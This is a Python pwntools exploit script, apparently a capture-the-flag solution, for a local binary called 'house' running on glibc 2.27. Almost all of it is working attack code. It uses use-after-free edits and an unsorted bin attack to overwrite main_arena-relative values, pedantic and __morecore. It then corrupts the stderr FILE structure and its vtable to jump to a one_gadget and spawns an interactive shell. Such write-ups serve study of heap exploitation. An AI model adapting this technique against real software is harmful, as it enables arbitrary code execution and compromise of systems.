#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./house", checksec=0)
libc = ELF("./libc-2.27.so", checksec=0)
ld = ELF("./ld-2.27.so", checksec=0)

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

r = conn()


sl = lambda a: r.sendline(a)
s = lambda a: r.send(a)

def alloc(idx, size, spray=1):
    sl("1")
    sleep(0.01)
    sl(str(idx))
    sleep(0.01)
    sl(str(size))
    sleep(0.01)
    if spray:
        edit(idx, (p64(0)+p64(0x21))*(size//0x10))

def edit(idx, data):
    sl("2")
    sleep(0.01)
    sl(str(idx))
    sleep(0.01)
    s(data)
    sleep(0.01)

def free(idx):
    sl("3")
    sleep(0.01)
    sl(str(idx))
    sleep(0.01)

def create_AB(A, B, uaf1, uaf2, size, uaf_char=0):
    alloc(uaf1, 0x40, 0)
    edit(uaf1, "MAHERAZZOUZI")
    alloc(A, 0x10, 0)
    alloc(B, 0x10, 0)
    alloc(uaf2, 0x40, 0)
    if(uaf_char):
        free(uaf1)
        free(uaf2)
        edit(uaf2, p8(uaf_char))
        alloc(uaf1, 0x40)
        alloc(uaf2, 0x40)
        payload = (p64(0) + p64((size + 0x10) | 1))*4
        edit(uaf2, payload)

def offset2size(offset):
    return offset*2 - 0x30


def main():
    dumped_main_arena_start = offset2size(libc.sym['dumped_main_arena_start'] - libc.sym["main_arena"] + 0x10)
    pedantic        =   offset2size(libc.sym['pedantic'] - libc.sym["main_arena"] + 0x10)
    __morecore      =   offset2size(libc.sym['__morecore'] - libc.sym["main_arena"] + 0x10)
    _flags          =   offset2size(libc.sym['_IO_2_1_stderr_'] + 0x00 - libc.sym["main_arena"] + 0x10)
    _IO_write_ptr   =   offset2size(libc.sym["_IO_2_1_stderr_"] + 0x28 - libc.sym["main_arena"] + 0x10)
    _IO_buf_base    =   offset2size(libc.sym["_IO_2_1_stderr_"] + 0x38 - libc.sym["main_arena"] + 0x10)
    _IO_buf_end     =   offset2size(libc.sym["_IO_2_1_stderr_"] + 0x40 - libc.sym["main_arena"] + 0x10)
    vtable          =   offset2size(libc.sym["_IO_2_1_stderr_"] + 0xd8 - libc.sym["main_arena"] + 0x10)
    s_alloc_rip     =   offset2size(libc.sym["_IO_2_1_stderr_"] + 0xe0 - libc.sym["main_arena"] + 0x10)

    # Alloc for unsorted bin attack
    alloc(0, 0x450)

    
    # Add all the offsets we want to change later
    # Those don't need a "transplant"
    # only change.
    alloc(4, pedantic, 0)
    alloc(5, dumped_main_arena_start)
    alloc(6, _flags)
    alloc(7, _IO_write_ptr)
    alloc(8, _IO_buf_base)
    alloc(9, vtable)

    # Those two need to a "transplant"
    create_AB(10, 11, 12, 13, _IO_buf_end, 0x70)
    create_AB(14, 15, 16, 17, s_alloc_rip, 0x50)

    # Just to have fake chunks
    # And bypass the next chunk integrity check
    alloc(20, 0x3000)


    # Alloc for NON_MAIN_ARENA
    # Large bin chunk.
    alloc(3, 0x420, 0)
    alloc(1, 0x420, 0)
    alloc(39, 0x10, 0)
    free(3)
    free(1)
    alloc(3, 0x430, 0)
    alloc(2, 0x430, 0)
    edit(1, p64(0) + p64(0x440 | 0b101))
    
    # All setup
    # Let's do unsorted bin attack first
    free(0)
    edit(0, p64(0) + p32(0xf7dd1940-0x10))
    alloc(0, 0x450)

    # Change dumped_main_arena start to 0x440
    free(5)
    edit(5, p64(0x410))
    alloc(5, dumped_main_arena_start)
    
    # Free pedantice to a writable area
    # Heap area
    free(4)

    # Change _flags to 0.
    free(6)
    edit(6, p64(0))
    alloc(6, _flags)

    # Change _IO_write_ptr to a large value
    free(7)
    edit(7, p64(0x7fffffffffffffff))
    alloc(7, _IO_write_ptr)

    # Change _IO_buf_base to the offset between
    # __default_morecore - one_gadget
    free(8)
    edit(8, p64(0x4be9b))
    alloc(8, _IO_buf_base)

    # Need to write *(__morecore) to _IO_buf_end
    free(11)
    free(10)
    edit(10, p8(0x70))
    alloc(10, _IO_buf_end, 0)
    edit(13, p64(0) + p64((__morecore+0x10) | 0x1))
    free(10)
    edit(13, p64(0) + p64((__morecore+0x10) | 0x1))
    alloc(10, __morecore, 0)
    edit(13, p64(0) + p64((_IO_buf_end+0x10) | 0x1))
    alloc(18, _IO_buf_end, 0)

    # Change the vtable to vtable-0x20
    free(9)
    edit(9, p16(0xc360)) #0x80 _IO_str_jumps
    alloc(9, vtable)

    # Change stderr + 0xe0 to call rax
    free(15)
    free(14)
    edit(14, p8(0x50))
    alloc(14, s_alloc_rip, 0)
    edit(17, p64(0) + p64((__morecore+0x10) | 0x1))
    free(14)
    edit(17, p64(0) + p64((s_alloc_rip+0x10)|0x1))
    edit(14, p16(0xf315))
    alloc(14, s_alloc_rip, 0)
    
    # Trigger!
    # We need stderr activity.
    pause()
    alloc(30, 0x30, 0)

    r.interactive()


if __name__ == "__main__":
    main()
